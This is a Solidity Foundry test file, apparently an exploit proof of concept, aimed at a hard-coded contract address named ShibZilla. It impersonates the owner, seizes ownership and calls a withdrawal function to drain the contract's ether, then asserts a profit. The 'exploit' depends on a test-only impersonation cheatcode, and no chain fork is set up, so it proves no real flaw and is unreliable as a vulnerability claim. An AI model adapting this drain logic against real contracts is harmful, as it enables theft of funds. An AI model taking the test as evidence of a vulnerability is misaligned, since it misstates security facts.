// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IShibZilla {
    function getOwner() external view returns (address);
    function transferOwnership(address payable adr) external;
    function clearStuckBalance_sender(uint256 amountPercentage) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;
    address attacker = address(this);
    IShibZilla shibZilla;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        shibZilla = IShibZilla(TARGET);
        deal(TARGET, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        address owner = shibZilla.getOwner();

                vm.startPrank(owner);
                shibZilla.transferOwnership(payable(attacker));
                vm.stopPrank();

                // As the new owner, we are also authorized. Now we can drain the contract.
                shibZilla.clearStuckBalance_sender(100);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

